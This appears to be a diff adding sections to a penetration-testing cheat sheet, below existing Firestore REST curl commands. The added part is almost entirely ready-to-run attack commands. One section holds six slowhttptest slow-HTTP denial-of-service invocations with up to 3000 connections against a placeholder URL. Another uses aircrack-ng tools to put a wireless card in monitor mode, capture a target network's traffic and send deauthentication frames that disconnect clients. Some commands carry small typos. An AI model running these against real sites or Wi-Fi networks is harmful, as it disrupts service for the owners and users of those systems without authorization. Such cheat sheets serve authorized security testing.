@@ -399,6 +399,42 @@ curl -X GET "https://firestore.googleapis.com/v1/projects/YOUR_PROJECT_ID/databa
 
 curl -X DELETE "https://firestore.googleapis.com/v1/projects/YOUR_PROJECT_ID/databases/(default)/documents/<Koleksiyon Adı>/<ID>";
 
+## DOS Attack ##
+
+slowhttptest -c 1000 -H -r 200 -c 400 -i 10 -t POST -l 3600 -o ~/Desktop/slow-test1 -g -u https://pentesturl.xyz
+
+slowhttptest -c 3000 -X -r 200 -w 4096 -y 8192 -i 10 -t POST -n 3 -z 32 -x 24 -k 2 -p 2 -l 3600 -o ~/Desktop/slow-test2 -g -u https://pentesturl.xyz
+
+slowhttptest -c 1000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 o- ~/Desktop/slow-test3 -g -u https://pentesturl.xyz
+
+slowhttptest -c 1000 -X -r 200 -w 20 -y 40 -n 5 -z 32 -k 3 o- ~/Desktop/slow-test4 -g -u https://pentesturl.xyz
+
+slowhttptest -c 2000 -X -r 200 -w 2048 -y 4096 -n 3 -z 32 -k 2 -p 3 -l 3600 -o ~/Desktop/slow-test5 -g -u https://pentesturl.xyz
+
+slowhttptest -c 3000 -B -r 300 -i 100  -s 8192 -t fakeverb -p 3 -x 20 -o ~/Desktop/slow-test6 -g -u https://pentesturl.xyz
+
+## Airmon-NG ##
+
+airmon-ng start wlan0
+
+airmon-ng check kill
+
+airodump-ng wlan0mon
+
+airodump-ng --channel 8 --bssid 11:22:33:44:55:66 --write airodump wlan0mon 
+
+aireplay-ng --deauth 5 -a 11:22:33:44:55:66 wlan0mon
+
+aireplay-ng --deauth 5 -a 11:22:33:44:55:66 -c 55:44:88:66:11:22 wlan0mon
+
+iwconfig
+
+ifconfig wlan0 down
+
+ifconfig wlan0 mode monitor
+
+ifconfig wlan0 up
+
 
 
  
